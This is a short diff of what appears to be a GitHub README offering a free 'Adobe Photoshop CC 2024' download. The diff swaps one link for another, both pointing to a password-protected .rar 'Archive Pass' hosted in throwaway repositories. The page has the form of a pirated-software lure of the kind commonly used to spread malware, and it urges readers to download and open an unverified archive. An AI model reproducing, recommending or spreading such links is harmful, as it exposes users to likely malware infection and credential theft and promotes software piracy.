@@ -2,7 +2,7 @@
 
 ![Adobe-Photosh0p-CC-2024](https://github.com/user-attachments/assets/b56dbeaf-a511-48b9-a58b-56c751dc06fc)
 
-# Download [file](https://github.com/theFutureGuy/Adobe-Photoshop-Descargar/raw/main/Adobe%20Photoshop%20Archive%20Pass-2024.rar)
+# Download [file](https://github.com/Miqael-Dev/Software/raw/main/Software%20Archive%20Pass%20-%202024.rar)
 
 ## Archive Pass - 2024 
 ## Archive Pass - 2024
